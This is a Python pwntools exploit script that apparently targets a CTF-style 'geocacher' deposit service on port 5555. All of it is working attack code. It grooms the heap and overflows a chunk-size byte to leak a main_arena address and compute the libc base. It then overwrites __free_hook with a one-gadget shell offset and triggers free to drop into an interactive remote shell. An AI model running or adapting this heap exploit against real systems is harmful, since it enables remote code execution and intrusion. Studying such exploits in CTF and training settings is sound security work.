import math
import os
import random
from client import DepositClient
from pwn import *
import geocacher_pb2
import traceback
import time

PORT = 5555


class Service(object):
    def __init__(self, host):
        self.client = DepositClient(sign=False)
        self.conn = remote(host, PORT)
        self.conn.recvuntil('> ')
        self.conn.sendline(self.client.handshake())
        self.conn.sendline(self.client.handshake_response(self.conn.recvuntil('> ', drop=True)))
        self.conn.recvuntil('> ', drop=True)

        self.slots = {}

    def malloc(self, slot, size_hint, fill, override_coords=None):
        if override_coords is None:
            location = self.client.pick_location(rce_flag=0)
        else:
            location = struct.unpack("II", override_coords)
        self.conn.sendline(self.client.store_secret(fill, location, size_hint, key=b"\x00"*8))
        response = self.client.parse_response(self.conn.recvuntil('> ', drop=True))
        assert response.status == 0, "Failed to store flag"
        password = response.key
        self.slots[slot] = (location, password)

    def free(self, slot, wait=True):
        location, password = self.slots[slot]

        self.conn.sendline(self.client.discard_secret(location, password))
        if wait:
            response = self.client.parse_response(self.conn.recvuntil('> ', drop=True))
            assert response.status == 0, "Failed to discard flag"

    def show(self, slot):
        location, password = self.slots[slot]

        self.conn.sendline(self.client.get_secret(location, password))
        response = self.client.parse_response(self.conn.recvuntil('> ', drop=True))
        svc_flag = response.secret
        return svc_flag

    def interactive(self):
        self.conn.interactive()


if __name__ == '__main__':
    binsh_gadget_offset = 0xe2383
    main_arena_offset = 0x1e4c00
    free_hook_offset = 0x1e75a8

    storage_prefix = 16
    heap_meta_size = 8

    small_size = 0x78
    big_size = 0x98

    fill_char = b" "

    small_content = fill_char * (small_size - storage_prefix)
    small_meta_content = fill_char * (small_size - storage_prefix + heap_meta_size)
    small_hint = small_size - storage_prefix + 1

    big_hint = big_size - storage_prefix + 1

    chunk_size_overflow = bytes([(big_size + heap_meta_size) % 256 + 1])

    service = Service(sys.argv[1])

    for i in range(10):
        service.malloc(i, small_hint, small_content)

    for i in range(10):
        service.free(i)

    service.malloc(0, small_hint, small_content)
    service.malloc(1, small_hint, small_content + chunk_size_overflow)

    service.free(0)
    service.malloc(0, big_hint, small_meta_content + fill_char)
    
    heap_leak = service.show(0)
    main_arena_address = struct.unpack("Q", heap_leak[-6:] + b"\x00\x00")[0] - ord(fill_char)
    
    libc_base_address = main_arena_address - main_arena_offset

    print(hex(libc_base_address))

    service.malloc(2, small_hint, small_content)
    service.malloc(3, small_hint, small_content + chunk_size_overflow)
    service.free(1)
    service.free(2)

    service.malloc(1, big_hint, small_meta_content + struct.pack("Q", libc_base_address + free_hook_offset))
    service.malloc(2, small_hint, small_content)
    service.malloc(4, small_hint, small_content, override_coords=struct.pack("Q", libc_base_address + binsh_gadget_offset))

    print("This doesn't work every time, but works often enough")
    print("Try again if you see something like BwAAAAAAAAABBAAAAJSf40smDFXdbr1OvRAfowUDQQvh4UcmmI5vK5yxDNKX")
    service.free(0, wait=False)

    service.interactive()
